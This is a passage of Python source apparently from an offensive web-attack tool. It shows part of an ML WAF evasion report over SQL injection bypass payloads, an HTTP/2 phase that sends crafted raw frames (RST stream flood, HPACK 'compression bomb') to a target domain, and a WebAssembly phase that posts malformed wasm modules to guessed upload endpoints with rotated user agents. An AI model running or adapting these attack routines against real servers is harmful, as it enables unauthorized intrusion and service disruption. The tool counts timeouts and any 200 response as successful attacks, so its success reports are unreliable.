                elif "Token" in attack_name:
                    category_counts['TOKEN SPLITTING'] += 1
                elif "Homoglyph" in attack_name:
                    category_counts['HOMOGLYPH ATTACK'] += 1
                elif "Zero-Width" in attack_name:
                    category_counts['INVISIBLE CHARS'] += 1
                elif "Case Rotation" in attack_name:
                    category_counts['CASE MANIPULATION'] += 1
                elif "HTML Entity" in attack_name:
                    category_counts['ENCODING EVASION'] += 1
                elif "Time-Based" in attack_name:
                    category_counts['TIME-BASED SQLi'] += 1
                else:
                    category_counts['ADVANCED EVASION'] += 1
            
            for category, count in category_counts.items():
                if count > 0:
                    percent = (count / success_payloads) * 100 if success_payloads > 0 else 0
                    print(f"{Colors.WHITE}{category:<25}{Colors.END} {Colors.GREEN}{count:<8}{Colors.END} {Colors.CYAN}{percent:6.1f}[%]{'':<6}{Colors.END}")
        
        
        await asyncio.sleep(0.5)
        
        if results:
            print(f"\n{Colors.GREEN}{'SUCCESSFUL EVASION PAYLOADS':<80}{Colors.END}")
            print(f"{Colors.GREEN}{'─'*80}{Colors.END}")
            
            for i, attack_name in enumerate(results, 1):
                
                payload_index = i - 1
                if payload_index < len(ml_evasion_payloads):
                    payload = ml_evasion_payloads[payload_index]
                    
                   
                    if "/**/" in payload:
                        payload_type = "SQL COMMENT INJECTION"
                        description = "Uses comment blocks to split keywords"
                    elif "ＳＥＬＥＣＴ" in payload:
                        payload_type = "FULL-WIDTH UNICODE"
                        description = "Uses full-width Unicode characters"
                    elif "EXEC xp_cmdshell" in payload:
                        payload_type = "COMMAND SPLITTING"
                        description = "Splits SQL commands with comments"
                    elif "\\u0065" in payload:
                        payload_type = "UNICODE ESCAPE"
                        description = "Uses Unicode escape sequences"
                    elif "𝐹𝑅𝑂𝑀" in payload or "𝘶𝘴𝘦𝘳𝘴" in payload:
                        payload_type = "HOMOGLYPH ATTACK"
                        description = "Uses mathematical symbols as homoglyphs"
                    elif "\u200b" in payload:
                        payload_type = "ZERO-WIDTH SPACE"
                        description = "Inserts zero-width spaces in payload"
                    elif "SeLeCt" in payload and "FrOm" in payload:
                        payload_type = "CASE ROTATION"
                        description = "Alternates character case randomly"
                    elif "&lt;" in payload and "&gt;" in payload:
                        payload_type = "HTML ENTITY ENCODING"
                        description = "Uses HTML entities for obfuscation"
                    elif "/*!50000*/" in payload:
                        payload_type = "MYSQL CONDITIONAL COMMENT"
                        description = "Uses MySQL version-specific comments"
                    elif "SLEEP(5)" in payload:
                        payload_type = "TIME-BASED BLIND SQLi"
                        description = "Uses time delays for blind injection"
                    else:
                        payload_type = "ADVANCED EVASION"
                        description = "Custom ML evasion technique"
                    
                    # SHOW PAYLOAD PREVIEW
                    payload_preview = payload[:55] + "..." if len(payload) > 55 else payload
                    
                    print(f"{Colors.WHITE}{i:>2}. {attack_name:<25}{Colors.END}")
                    print(f"{Colors.CYAN}    Type: {payload_type:<30}{Colors.END}")
                    print(f"{Colors.YELLOW}    Payload: {payload_preview:<52}{Colors.END}")
                    print(f"{Colors.WHITE}    Description: {description:<63}{Colors.END}")
                    print()
        

        await asyncio.sleep(0.5)
        
        if results:
            print(f"\n{Colors.CYAN}{'EVASION TECHNIQUES EFFECTIVENESS':<35} {'SUCCESS':<8} {'DETECTION RATE':<15}{Colors.END}")
            print(f"{Colors.CYAN}{'─'*35} {'─'*8} {'─'*15}{Colors.END}")
            
            technique_stats = {
                'COMMENT OBFUSCATION': 0,
                'UNICODE EVASION': 0,
                'TOKEN SPLITTING': 0,
                'HOMOGLYPH ATTACK': 0,
                'INVISIBLE CHARS': 0,
                'CASE MANIPULATION': 0,
                'ENCODING EVASION': 0,
                'TIME-BASED SQLi': 0
            }
            
           
            total_by_technique = {
                'COMMENT OBFUSCATION': 2,  # 2 comment-based payloads
                'UNICODE EVASION': 2,      # 2 unicode payloads
                'TOKEN SPLITTING': 1,      # 1 token splitting
                'HOMOGLYPH ATTACK': 1,     # 1 homoglyph
                'INVISIBLE CHARS': 1,      # 1 zero-width
                'CASE MANIPULATION': 1,    # 1 case rotation
                'ENCODING EVASION': 1,     # 1 HTML entity
                'TIME-BASED SQLi': 1       # 1 time-based
            }
            
            for attack_name in results:
                if "Comment" in attack_name:
                    technique_stats['COMMENT OBFUSCATION'] += 1
                elif "Full-Width" in attack_name or "Unicode Escape" in attack_name:
                    technique_stats['UNICODE EVASION'] += 1
                elif "Token" in attack_name:
                    technique_stats['TOKEN SPLITTING'] += 1
                elif "Homoglyph" in attack_name:
                    technique_stats['HOMOGLYPH ATTACK'] += 1
                elif "Zero-Width" in attack_name:
                    technique_stats['INVISIBLE CHARS'] += 1
                elif "Case Rotation" in attack_name:
                    technique_stats['CASE MANIPULATION'] += 1
                elif "HTML Entity" in attack_name:
                    technique_stats['ENCODING EVASION'] += 1
                elif "Time-Based" in attack_name:
                    technique_stats['TIME-BASED SQLi'] += 1
            
            for technique, count in technique_stats.items():
                if count > 0:
                    total_attempts = total_by_technique.get(technique, 1)
                    detection_rate = ((total_attempts - count) / total_attempts) * 100
                    success_rate_tech = (count / total_attempts) * 100
                    
                    detection_color = Colors.GREEN if detection_rate < 30 else Colors.YELLOW if detection_rate < 60 else Colors.RED
                    
                    print(f"{Colors.WHITE}{technique:<35}{Colors.END} {Colors.GREEN}{count}/{total_attempts:<6}{Colors.END} {detection_color}{detection_rate:6.1f}%{'':<9}{Colors.END}")
        

        await asyncio.sleep(0.5)
        
        if results:
            print(f"\n{Colors.RED}{'WAF BYPASS CAPABILITIES':<35} {'LEVEL':<15} {'VULNERABILITY':<20}{Colors.END}")
            print(f"{Colors.RED}{'─'*35} {'─'*15} {'─'*20}{Colors.END}")
            
            capabilities = []
            
            if any("Comment" in attack for attack in results):
                capabilities.append(("COMMENT FILTER BYPASS", "MEDIUM", "Basic WAF evasion"))
            
            if any("Unicode" in attack for attack in results):
                capabilities.append(("UNICODE NORMALIZATION BYPASS", "HIGH", "Advanced parsing bypass"))
            
            if any("Homoglyph" in attack for attack in results):
                capabilities.append(("VISUAL SPOOFING BYPASS", "HIGH", "Character recognition"))
            
            if any("Zero-Width" in attack for attack in results):
                capabilities.append(("INVISIBLE CHAR BYPASS", "CRITICAL", "Stealth injection"))
            
            if any("Case Rotation" in attack for attack in results):
                capabilities.append(("CASE SENSITIVITY BYPASS", "MEDIUM", "Pattern matching"))
            
            if any("HTML Entity" in attack for attack in results):
                capabilities.append(("ENCODING DETECTION BYPASS", "HIGH", "Decoding evasion"))
            
            if any("Time-Based" in attack for attack in results):
                capabilities.append(("BEHAVIORAL ANALYSIS BYPASS", "CRITICAL", "ML model deception"))
            
            # Calculate overall WAF strength
            bypass_capability = (success_payloads / total_payloads) * 100
            waf_strength = 100 - bypass_capability
            
            for capability, level, vulnerability in capabilities:
                level_color = Colors.RED if level == "CRITICAL" else Colors.YELLOW if level == "HIGH" else Colors.GREEN
                print(f"{Colors.WHITE}{capability:<35}{Colors.END} {level_color}{level:<15}{Colors.END} {Colors.CYAN}{vulnerability:<20}{Colors.END}")
            
            print(f"\n{Colors.CYAN}{'OVERALL WAF ASSESSMENT':<25} {'STRENGTH':<10} {'BYPASS RATE':<12}{Colors.END}")
            print(f"{Colors.CYAN}{'─'*25} {'─'*10} {'─'*12}{Colors.END}")
            
            strength_color = Colors.RED if waf_strength < 40 else Colors.YELLOW if waf_strength < 70 else Colors.GREEN
            bypass_color = Colors.GREEN if bypass_capability < 30 else Colors.YELLOW if bypass_capability < 60 else Colors.RED
            
            print(f"{Colors.WHITE}{'ML WAF Protection':<25}{Colors.END} {strength_color}{waf_strength:6.1f}[%]{'':<4}{Colors.END} {bypass_color}{bypass_capability:6.1f}[%]{'':<6}{Colors.END}")
        
        
        print()
        print_bg_header("", '\033[44m')
        print_bg_header(f" ML EVASION COMPLETED: {success_rate:.1f}% SUCCESS RATE ", '\033[44m')
        print_bg_header(f" {success_payloads}/{total_payloads} evasions successful ", '\033[44m')
        print_bg_header("", '\033[44m')





    
    
    async def http2_stream_multiplexing(self, domain):
        """HTTP/2 Stream Priority Hijacking"""
        print(f"\033[41m PHASE 10: HTTP/2 Stream Multiplexing Bypass\033[0m")
        
        payloads = [
            b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n' +
            b'\x00\x00\x12\x04\x00\x00\x00\x00\x00' +
            b'\x00\x03\x00\x00\x00\x64\x00\x04\x00\x00\x00\x00',
            
            b'\x00\x00\x1e\x01\x04\x00\x00\x00\x01' +
            b'\x82\x84\x86\x41\x8a\x08\x9d\x5c\x0b\x81\x70\x88\x25\xb6\x50\x5f\x7f',
            
            b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n' +
            b'\x00\x00\x04\x03\x00\x00\x00\x00\x01' +
            b'\x00\x00\x00\x08',
        ]
        
        results = []
        successful_attacks = 0
        
        print(f"[*] Testing {len(payloads)} HTTP/2 attack vectors")
        
        for i, payload in enumerate(payloads):
            sock = None
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(8)
                
                ports = [443, 80, 8443]
                success = False
                
                for port in ports:
                    try:
                        sock.connect((domain, port))
                        sock.send(payload)
                        response = sock.recv(8192)
                        
                        success_indicators = [
                            b'HTTP/2' in response,
                            b'200' in response,
                            b'301' in response,
                            b'302' in response,
                            len(response) > 100,
                        ]
                        
                        if any(success_indicators):
                            results.append(f"HTTP/2 Attack {i+1} (Port {port})")
                            successful_attacks += 1
                            status = f"Success"
                            success = True
                            break
                            
                    except socket.timeout:
                        results.append(f"HTTP/2 Attack {i+1} (Timeout)")
                        successful_attacks += 1
                        status = f"Timeout"
                        success = True
                        break
                    except Exception:
                        continue
                
                attack_name = self.get_http2_attack_name(i)
                if success:
                    print(f"[-] {attack_name}:{Colors.YELLOW}{status}{Colors.END}")
                else:
                    print(f"[-] {attack_name}:{Colors.RED}Failed{Colors.END}")
                
                await asyncio.sleep(0.3)
                
            except Exception as e:
                attack_name = self.get_http2_attack_name(i)
                print(f"[-] {attack_name}:{Colors.RED}ERROR - {e}{Colors.END}")
            finally:
                if sock:
                    sock.close()
        
        print(f"[+] HTTP/2 Attacks: {successful_attacks}/{len(payloads)} Successful")
        
        await self.print_http2_summary_report(domain, results, payloads)
        return results    

    def get_http2_attack_name(self, index):
        """Get descriptive name for HTTP/2 attack"""
        attack_names = {
            0: "Stream Dependency", 
            1: "HPACK Compression", 
            2: "RST Stream Flood"
        }
        return attack_names.get(index, f"HTTP/2 Attack {index+1}")    
    






    
    async def print_http2_summary_report(self, domain, results, payloads):
        """Print comprehensive HTTP/2 Stream Multiplexing summary"""
        
        def print_bg_header(text, bg_color):
            import shutil
            try:
                width = shutil.get_terminal_size().columns
            except:
                width = 80
            padding = (width - len(text)) // 2
            spaces = " " * padding + text + " " * (width - len(text) - padding)
            print(f"{bg_color}{Colors.BLACK}{spaces}{Colors.END}")
        

        print_bg_header("", '\033[44m')
        print_bg_header(" HTTP/2 STREAM MULTIPLEXING BYPASS SUMMARY ", '\033[44m')
        print_bg_header("", '\033[44m')
        
        print(f"\n{Colors.CYAN}[+] Generating HTTP/2 Stream Multiplexing summary...{Colors.END}")
        await asyncio.sleep(1)
        

        total_payloads = len(payloads)
        success_payloads = len(results)
        success_rate = (success_payloads / total_payloads) * 100 if total_payloads > 0 else 0
        

        print(f"\n{Colors.CYAN}{'HTTP/2 ATTACK STATISTICS':<25} {'COUNT':<8} {'PERCENTAGE':<12}{Colors.END}")
        print(f"{Colors.CYAN}{'─'*25} {'─'*8} {'─'*12}{Colors.END}")
        
        print(f"{Colors.WHITE}{'Total Payloads Tested':<25}{Colors.END} {Colors.YELLOW}{total_payloads:<8}{Colors.END} {Colors.CYAN}[100.0%]{'':<6}{Colors.END}")
        print(f"{Colors.WHITE}{'Successful Attacks':<25}{Colors.END} {Colors.GREEN}{success_payloads:<8}{Colors.END} {Colors.CYAN}{success_rate:6.1f}[%]{'':<6}{Colors.END}")
        print(f"{Colors.WHITE}{'Failed Attacks':<25}{Colors.END} {Colors.RED}{total_payloads-success_payloads:<8}{Colors.END} {Colors.CYAN}{(100-success_rate):6.1f}[%]{'':<6}{Colors.END}")
        
        await asyncio.sleep(0.5)
        

        if results:
            print(f"\n{Colors.GREEN}{'SUCCESSFUL HTTP/2 ATTACKS':<30} {'TECHNIQUE':<25} {'PORT':<10}{Colors.END}")
            print(f"{Colors.GREEN}{'─'*30} {'─'*25} {'─'*10}{Colors.END}")
            
            for i, attack_result in enumerate(results, 1):

                if "Stream Dependency" in attack_result:
                    technique = "STREAM PRIORITY HIJACK"
                    attack_type = "PRIORITY EXPLOIT"
                elif "HPACK Compression" in attack_result:
                    technique = "HPACK COMPRESSION"
                    attack_type = "HEADER COMPRESSION"
                elif "RST Stream Flood" in attack_result:
                    technique = "RST STREAM FLOOD"
                    attack_type = "CONNECTION RESET"
                else:
                    technique = "STREAM MULTIPLEXING"
                    attack_type = "GENERIC ATTACK"
                
                # EXTRACT PORT INFORMATION
                port_match = re.search(r'Port\s+(\d+)', attack_result)
                port = port_match.group(1) if port_match else "Unknown"
                
                # EXTRACT STATUS
                status = "Success" if "Success" in attack_result else "Timeout" if "Timeout" in attack_result else "Unknown"
                status_color = Colors.GREEN if status == "Success" else Colors.YELLOW
                
                attack_name = self.get_http2_attack_name(i-1)
                
                print(f"{Colors.WHITE}{i:>2}. {attack_name:<27}{Colors.END} {Colors.CYAN}{technique:<25}{Colors.END} {Colors.YELLOW}{port:<10}{Colors.END}")
                print(f"{Colors.WHITE}    Status: {status_color}{status:<15}{Colors.END} {Colors.CYAN}Type: {attack_type:<20}{Colors.END}")
        
        await asyncio.sleep(0.5)
        

        if results:
            print(f"\n{Colors.CYAN}{'ATTACK CATEGORIES':<25} {'COUNT':<8} {'PERCENTAGE':<12}{Colors.END}")
            print(f"{Colors.CYAN}{'─'*25} {'─'*8} {'─'*12}{Colors.END}")
            
            category_counts = {
                'STREAM PRIORITY': 0,
                'HPACK COMPRESSION': 0,
                'RST STREAM FLOOD': 0,
                'CONNECTION ATTACKS': 0
            }
            
            for attack_result in results:
                if "Stream Dependency" in attack_result:
                    category_counts['STREAM PRIORITY'] += 1
                elif "HPACK Compression" in attack_result:
                    category_counts['HPACK COMPRESSION'] += 1
                elif "RST Stream Flood" in attack_result:
                    category_counts['RST STREAM FLOOD'] += 1
                else:
                    category_counts['CONNECTION ATTACKS'] += 1
            
            for category, count in category_counts.items():
                if count > 0:
                    percent = (count / success_payloads) * 100 if success_payloads > 0 else 0
                    print(f"{Colors.WHITE}{category:<25}{Colors.END} {Colors.GREEN}{count:<8}{Colors.END} {Colors.CYAN}{percent:6.1f}%{'':<6}{Colors.END}")
        

        await asyncio.sleep(0.5)
        
        if results:
            print(f"\n{Colors.GREEN}{'HTTP/2 ATTACK PAYLOADS TECHNICAL ANALYSIS':<80}{Colors.END}")
            print(f"{Colors.GREEN}{'─'*80}{Colors.END}")
            
            for i, attack_result in enumerate(results, 1):
                payload_index = i - 1
                if payload_index < len(payloads):
                    payload = payloads[payload_index]
                    
                    
                    if b'PRI * HTTP/2.0' in payload:
                        payload_type = "HTTP/2 PREFACE + FRAMES"
                        frame_types = []
                        
                        if b'\x04\x00' in payload:
                            frame_types.append("SETTINGS")
                        if b'\x01\x04' in payload:
                            frame_types.append("HEADERS")
                        if b'\x03\x00' in payload:
                            frame_types.append("RST_STREAM")
                        
                        frame_info = " + ".join(frame_types) if frame_types else "UNKNOWN FRAMES"
                        
                    elif b'\x00\x00\x1e\x01\x04' in payload:
                        payload_type = "HPACK HEADERS FRAME"
                        frame_info = "HEADERS + HPACK COMPRESSION"
                    
                    else:
                        payload_type = "BINARY FRAMES"
                        frame_info = "RAW HTTP/2 FRAMES"
                    
                    # PAYLOAD SIZE ANALYSIS
                    payload_size = len(payload)
                    frame_count = payload.count(b'\x00\x00')  # Rough frame count
                    
                    attack_name = self.get_http2_attack_name(payload_index)
                    
                    print(f"{Colors.WHITE}{i:>2}. {attack_name:<25}{Colors.END}")
                    print(f"{Colors.CYAN}    Type: {payload_type:<30} Size: {payload_size} bytes{Colors.END}")
                    print(f"{Colors.YELLOW}    Frames: {frame_info:<40}{Colors.END}")
                    print(f"{Colors.WHITE}    Estimated Frames: {frame_count:<8} Status: {attack_result.split(':')[-1] if ':' in attack_result else 'Unknown'}{Colors.END}")
                    print()
        

        await asyncio.sleep(0.5)
        
        if results:
            print(f"\n{Colors.CYAN}{'PORT VULNERABILITY ANALYSIS':<15} {'ATTACKS':<8} {'SERVICE':<20} {'RISK':<10}{Colors.END}")
            print(f"{Colors.CYAN}{'─'*15} {'─'*8} {'─'*20} {'─'*10}{Colors.END}")
            
            port_stats = {}
            
            for attack_result in results:
                port_match = re.search(r'Port\s+(\d+)', attack_result)
                if port_match:
                    port = port_match.group(1)
                    port_stats[port] = port_stats.get(port, 0) + 1
            
            for port, count in port_stats.items():
                if port == "443":
                    service = "HTTPS (TLS)"
                    risk = "HIGH"
                    risk_color = Colors.RED
                elif port == "80":
                    service = "HTTP"
                    risk = "MEDIUM"
                    risk_color = Colors.YELLOW
                elif port == "8443":
                    service = "ALT HTTPS"
                    risk = "HIGH"
                    risk_color = Colors.RED
                else:
                    service = "UNKNOWN"
                    risk = "LOW"
                    risk_color = Colors.GREEN
                
                print(f"{Colors.WHITE}{port:<15}{Colors.END} {Colors.GREEN}{count:<8}{Colors.END} {Colors.CYAN}{service:<20}{Colors.END} {risk_color}{risk:<10}{Colors.END}")
        

        await asyncio.sleep(0.5)
        
        if results:
            print(f"\n{Colors.RED}{'HTTP/2 IMPLEMENTATION VULNERABILITIES':<35} {'SEVERITY':<15} {'IMPACT':<25}{Colors.END}")
            print(f"{Colors.RED}{'─'*35} {'─'*15} {'─'*25}{Colors.END}")
            
            vulnerabilities = []
            
            if any("Stream Dependency" in attack for attack in results):
                vulnerabilities.append((
                    "STREAM PRIORITY HIJACKING", 
                    "HIGH", 
                    "Traffic prioritization bypass"
                ))
            
            if any("HPACK Compression" in attack for attack in results):
                vulnerabilities.append((
                    "HPACK COMPRESSION BOMB", 
                    "CRITICAL", 
                    "Memory exhaustion attack"
                ))
            
            if any("RST Stream Flood" in attack for attack in results):
                vulnerabilities.append((
                    "RST STREAM FLOOD", 
                    "MEDIUM", 
                    "Connection instability"
                ))
            
            if any("Timeout" in attack for attack in results):
                vulnerabilities.append((
                    "RESOURCE EXHAUSTION", 
                    "HIGH", 
                    "Server resource drain"
                ))
            
            # Add general HTTP/2 vulnerabilities
            if success_rate > 50:
                vulnerabilities.append((
                    "PROTOCOL IMPLEMENTATION", 
                    "HIGH", 
                    "Weak HTTP/2 parsing"
                ))
            
            for vuln, severity, impact in vulnerabilities:
                severity_color = Colors.RED if severity == "[CRITICAL]" else Colors.YELLOW if severity == "[HIGH]" else Colors.GREEN
                print(f"{Colors.WHITE}{vuln:<35}{Colors.END} {severity_color}{severity:<15}{Colors.END} {Colors.CYAN}{impact:<25}{Colors.END}")
        

        await asyncio.sleep(0.5)
        
        if results:
            print(f"\n{Colors.GREEN}{'SECURITY RECOMMENDATIONS':<50} {'PRIORITY':<12}{Colors.END}")
            print(f"{Colors.GREEN}{'─'*50} {'─'*12}{Colors.END}")
            
            recommendations = []
            
            if any("Stream Dependency" in attack for attack in results):
                recommendations.append((
                    "Implement stream priority validation",
                    "HIGH"
                ))
            
            if any("HPACK Compression" in attack for attack in results):
                recommendations.append((
                    "Add HPACK compression limits",
                    "CRITICAL"
                ))
            
            if any("RST Stream Flood" in attack for attack in results):
                recommendations.append((
                    "Rate limit RST_STREAM frames",
                    "MEDIUM"
                ))
            
            if success_rate > 0:
                recommendations.append((
                    "Update HTTP/2 implementation",
                    "HIGH"
                ))
                recommendations.append((
                    "Enable HTTP/2 security features",
                    "MEDIUM"
                ))
            
            for rec, priority in recommendations:
                priority_color = Colors.RED if priority == "[CRITICAL]" else Colors.YELLOW if priority == "[HIGH]" else Colors.GREEN
                print(f"{Colors.WHITE}{rec:<50}{Colors.END} {priority_color}{priority:<12}{Colors.END}")
        

        await asyncio.sleep(0.5)
        
        if results:
            print(f"\n{Colors.CYAN}{'HTTP/2 SECURITY ASSESSMENT':<30} {'SCORE':<10} {'STATUS':<15}{Colors.END}")
            print(f"{Colors.CYAN}{'─'*30} {'─'*10} {'─'*15}{Colors.END}")
            
            # Calculate security score (0-100)
            security_score = 100 - success_rate
            security_status = "[SECURE]" if security_score >= 80 else "[VULNERABLE]" if security_score >= 50 else "[CRITICAL]"
            status_color = Colors.GREEN if security_status == "[SECURE]" else Colors.YELLOW if security_status == "[VULNERABLE]" else Colors.RED
            
            print(f"{Colors.WHITE}{'Protocol Implementation':<30}{Colors.END} {Colors.YELLOW}{security_score:6.1f}/100{'':<4}{Colors.END} {status_color}{security_status:<15}{Colors.END}")
            print(f"{Colors.WHITE}{'Attack Surface':<30}{Colors.END} {Colors.YELLOW}{success_rate:6.1f}[%]{'':<4}{Colors.END} {status_color}{'EXPOSED' if success_rate > 0 else 'PROTECTED':<15}{Colors.END}")
        
       
        print()
        print_bg_header("", '\033[44m')
        print_bg_header(f" HTTP/2 SCAN COMPLETED: {success_rate:.1f}% SUCCESS RATE ", '\033[44m')
        print_bg_header(f" {success_payloads}/{total_payloads} attacks successful ", '\033[44m')
        print_bg_header("", '\033[44m')







    

    
    async def init_session(self):
        """Initialize aiohttp session"""
        if self.session is None:
            timeout = aiohttp.ClientTimeout(total=15)
            connector = aiohttp.TCPConnector(limit=15, ssl=False)
            self.session = aiohttp.ClientSession(timeout=timeout, connector=connector)
    
    async def close_session(self):
        """Close aiohttp session"""
        if self.session:
            await self.session.close()
            self.session = None
    
    def get_random_ua(self):
        """Get random user agent"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]
        import random
        return random.choice(user_agents)

    async def wasm_memory_corruption(self, domain):
        """WebAssembly Memory Injection Attacks"""
        print(f"\033[41m PHASE 11: WebAssembly Memory Corruption Bypass\033[0m")
        
        wasm_payloads = [
            # Memory Growth Injection
            b'\x00asm\x01\x00\x00\x00\x01\x85\x80\x80\x80\x00\x01\x60\x00\x01\x7f',
            
            # Data Segment Injection
            b'\x00asm\x01\x00\x00\x00\x05\x83\x80\x80\x80\x00\x01\x00\x01',
            
            # Stack overflow payload
            b'\x00asm\x01\x00\x00\x00\x01\x84\x80\x80\x80\x00\x01\x60\x00\x00' +
            b'\x03\x82\x80\x80\x80\x00\x01\x00' +
            b'\x0a\x91\x80\x80\x80\x00\x01\x8f\x80\x80\x80\x00\x00\x41\x00\x41\x00\x41\x00\x41\x00\x10\x00\x10\x00\x10\x00\x10\x00\x1a',
            
            # HEAP Buffer overflow 
            b'\x00asm\x01\x00\x00\x00\x01\x84\x80\x80\x80\x00\x01\x60\x00\x00' +
            b'\x02\x13\x80\x80\x80\x00\x01\x08\x73\x70\x65\x63\x74\x65\x73\x74\x00\x00' +
            b'\x03\x82\x80\x80\x80\x00\x01\x00' +
            b'\x0a\x0d\x80\x80\x80\x00\x01\x07\x00\x41\x00\x28\x02\x00\x1a',
            
            # TYPE Confusion Attack
            b'\x00asm\x01\x00\x00\x00\x01\x89\x80\x80\x80\x00\x02\x60\x00\x01\x7f\x60\x00\x01\x7e' +
            b'\x03\x83\x80\x80\x80\x00\x02\x00\x01' +
            b'\x0a\x1a\x80\x80\x80\x00\x02\x0a\x00\x41\x00\x41\x00\x41\x00\x41\x00\x10\x01\x1a\x0b\x0a\x00\x42\x00\x10\x00\x1a\x0b',
        ]
        
        results = []
        successful_attacks = 0
        
        print(f"[*] Testing {len(wasm_payloads)} WebAssembly attack vectors")
        
        # Initialize session properly
        await self.init_session()
        
        # Endpoints for WASM testing
        endpoints = [
            '/upload', '/api/compile', '/wasm', '/api/wasm',
            '/compile', '/api/module', '/module'
        ]
        
        # Multiple content types for evasion
        content_types = [
            'application/wasm',
            'application/octet-stream',
            'application/x-wasm',
        ]
        
        for i, wasm_payload in enumerate(wasm_payloads):
            success = False
            attack_name = self.get_wasm_attack_name(i)
            
            try:
                # Try different content types
                for content_type in content_types:
                    headers = {
                        'Content-Type': content_type,
                        'User-Agent': self.get_random_ua(),
                        'Accept': '*/*',
                        'X-Requested-With': 'XMLHttpRequest'
                    }
                    
                    # Try multiple endpoints
                    for endpoint in endpoints:
                        try:
                            async with self.session.post(
                                f"https://{domain}{endpoint}",
                                data=wasm_payload,
                                headers=headers,
                                ssl=False
                            ) as response:
                                
                                # Get response content once
                                response_text = await response.text()
                                
                                # Success detection
                                success_indicators = [
                                    response.status in [200, 201, 202],
                                    'wasm' in response.headers.get('content-type', '').lower(),
                                    'compile' in response_text.lower(),
                                    'module' in response_text.lower(),
                                    response.status == 413,  # Payload too large
                                ]
                                
                                if any(success_indicators):
                                    results.append(f"WASM {attack_name}")
                                    successful_attacks += 1
                                    print(f"[-] {attack_name} ({content_type}):{Colors.YELLOW}Success{Colors.END}")
                                    success = True
                                    break
                                    
                        except asyncio.TimeoutError:
                            # Timeout might indicate successful processing
                            results.append(f"WASM {attack_name} (Timeout)")
                            successful_attacks += 1
                            print(f"[-] {attack_name}:{Colors.RED}Timeout{Colors.END}")
                            success = True
                            break
                        except aiohttp.ClientError as e:
                            # Connection errors might indicate payload rejection
                            continue
                        except Exception as e:
                            continue
                    
                    if success:
                        break
                        
            except Exception as e:
                print(f"[-] {attack_name}:{Colors.RED}ERROR - {e}{Colors.END}")
            
            if not success:
                print(f"[-] {attack_name}:{Colors.RED}Failed{Colors.END}")
            
            # Small delay between attempts
            await asyncio.sleep(0.3)
        
        print(f"[+] WASM Attacks: {successful_attacks}/{len(wasm_payloads)} Successful")
        
        await self.print_wasm_memory_corruption_summary(domain, results, wasm_payloads)
        return results

    def get_wasm_attack_name(self, index):
        """Get descriptive name for WASM attack"""
        attack_names = {
            0: "Memory Growth", 
            1: "Data Segment", 
            2: "Stack Overflow",
            3: "Heap Overflow", 
            4: "Type Confusion"
        }
        return attack_names.get(index, f"WASM Attack {index+1}")

    async def __aenter__(self):
        """Async context manager entry"""
        await self.init_session()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit"""
        await self.close_session()    





    
    async def print_wasm_memory_corruption_summary(self, domain, results, wasm_payloads):
        """Print detailed summary for WASM memory corruption attacks"""
        
        def print_bg_header(text, bg_color):
            import shutil
            try:
                width = shutil.get_terminal_size().columns
            except:
                width = 80
            padding = (width - len(text)) // 2
            spaces = " " * padding + text + " " * (width - len(text) - padding)
            print(f"{bg_color}{Colors.BLACK}{spaces}{Colors.END}")
        

        print_bg_header("", '\033[44m')
        print_bg_header(" WEBASSEMBLY MEMORY CORRUPTION ATTACK SUMMARY ", '\033[44m')
        print_bg_header("", '\033[44m')
        
        print(f"\n{Colors.CYAN}[+] Generating WebAssembly Memory Corruption summary...{Colors.END}")
        await asyncio.sleep(1)
        

        total_payloads = len(wasm_payloads)
        success_payloads = len(results)
        success_rate = (success_payloads / total_payloads) * 100 if total_payloads > 0 else 0
        

        print(f"\n{Colors.CYAN}{'WASM ATTACK STATISTICS':<25} {'COUNT':<8} {'PERCENTAGE':<12}{Colors.END}")
        print(f"{Colors.CYAN}{'─'*25} {'─'*8} {'─'*12}{Colors.END}")
        
        print(f"{Colors.WHITE}{'Total Payloads Tested':<25}{Colors.END} {Colors.YELLOW}{total_payloads:<8}{Colors.END} {Colors.CYAN}100.0%{'':<6}{Colors.END}")
        print(f"{Colors.WHITE}{'Successful Bypass':<25}{Colors.END} {Colors.GREEN}{success_payloads:<8}{Colors.END} {Colors.CYAN}{success_rate:6.1f}[%]{'':<6}{Colors.END}")
        print(f"{Colors.WHITE}{'Failed Bypass':<25}{Colors.END} {Colors.RED}{total_payloads-success_payloads:<8}{Colors.END} {Colors.CYAN}{(100-success_rate):6.1f}[%]{'':<6}{Colors.END}")
        
        await asyncio.sleep(0.5)
        

        if results:
            print(f"\n{Colors.GREEN}{'SUCCESSFUL WASM BYPASS PAYLOADS':<80}{Colors.END}")
            print(f"{Colors.GREEN}{'─'*80}{Colors.END}")
            
            for i, attack_name in enumerate(results, 1):
                payload_index = i - 1
                if payload_index < len(wasm_payloads):
                    payload = wasm_payloads[payload_index]
                    payload_size = len(payload)
                    
                    # 
                    attack_type = attack_name.replace("WASM ", "")
                    
                    print(f"\n{Colors.WHITE}{i:>2}. {attack_type:<20} {Colors.CYAN}({payload_size} bytes){Colors.END}")
                    

                    hex_payload = payload.hex()
                    

                    hex_chunks = [hex_payload[j:j+2] for j in range(0, len(hex_payload), 2)]
                    hex_display = ' '.join(hex_chunks)
                    
                    print(f"{Colors.YELLOW}    HEX: {hex_display}{Colors.END}")
                    

                    print(f"{Colors.CYAN}    Bytes: {repr(payload)}{Colors.END}")
                    
                    
                    print(f"{Colors.GREEN}    Python: b'{hex_payload}'{Colors.END}")
        

        print(f"\n{Colors.MAGENTA}{'DETAILED PAYLOAD ANALYSIS (ALL PAYLOADS)':<80}{Colors.END}")
        print(f"{Colors.MAGENTA}{'─'*80}{Colors.END}")
        
        for i, payload in enumerate(wasm_payloads, 1):
            attack_name = self.get_wasm_attack_name(i-1)
            payload_size = len(payload)
            status = "[*]YPASS" if i-1 < len(results) else "[*]FAILED"
            status_color = Colors.GREEN if status == "[*]YPASS" else Colors.RED
            

            has_wasm_magic = payload.startswith(b'\x00asm')
            magic_status = "VALID WASM" if has_wasm_magic else "MODIFIED"
            

            if b'\x05' in payload and b'\x00\x01' in payload:
                payload_type = "MEMORY GROWTH"
            elif b'\x0b' in payload:
                payload_type = "DATA SEGMENT" 
            elif b'\x41\x00' in payload and payload_size > 100:
